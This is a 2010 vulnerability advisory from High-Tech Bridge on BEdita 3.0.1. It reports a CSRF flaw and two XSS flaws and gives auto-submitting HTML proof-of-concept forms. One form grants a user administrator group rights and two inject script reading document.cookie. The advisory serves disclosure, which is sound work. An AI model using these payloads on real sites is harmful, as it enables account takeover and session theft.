@@ -1,0 +1,69 @@
+Vulnerability ID: HTB22729
+Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_bedita.html
+Product: BEdita
+Vendor: Chialab & ChannelWeb ( http://www.bedita.com/ ) 
+Vulnerable Version: 3.0.1.2550 "betula" and probably prior versions
+Vendor Notification: 30 November 2010 
+Vulnerability Type: CSRF (Cross-Site Request Forgery)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Low 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+CSRF:
+Vulnerability Details:
+The vulnerability exists due to failure in the "bedita-app/controllers/modules/admin_controller.php" script to properly verify the source of HTTP request.
+
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/bedita-app/admin/saveUser" method="post" name="main">
+
+<input type="hidden" name="data[User][id]" value="2">
+<input type="hidden" name="data[User][userid]" value="tester">
+<input type="hidden" name="data[User][realname]" value="tester">
+<input type="hidden" name="data[User][email]" value="email@example.com">
+<input type="hidden" name="pwd" value="">
+<input type="hidden" name="data[User][passwd]" value="">
+<input type="hidden" name="data[User][valid]" value="1">
+<input type="hidden" name="groups" value="">
+<input type="hidden" name="data[groups][administrator]" value="on">
+<input type="hidden" name="data[groups][guest]" value="on">
+</form>
+<script>
+document.main.submit();
+</script>
+
+Stored XSS:
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "bedita-app/controllers/modules/news_controller.php" script to properly sanitize user-supplied input in "data[label]" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/bedita-app/news/saveCategories" method="post" name="main">
+<input type="hidden" name="data[label]" value='cat"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="data[status]" value="on">
+<input type="hidden" name="data[area_id]" value="">
+<input type="hidden" name="data[object_type_id]" value="18">
+</form>
+<script>
+document.main.submit();
+</script>
+
+XSS:
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "bedita-app/controllers/home_controller.php" script to properly sanitize user-supplied input in "searchstring" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/bedita-app/news/index" method="post" name="main">
+<input type="hidden" name="searchstring" value='search"><script>alert(document.cookie)</script>'>
+</form>
+<script>
+document.main.submit();
+</script>
+
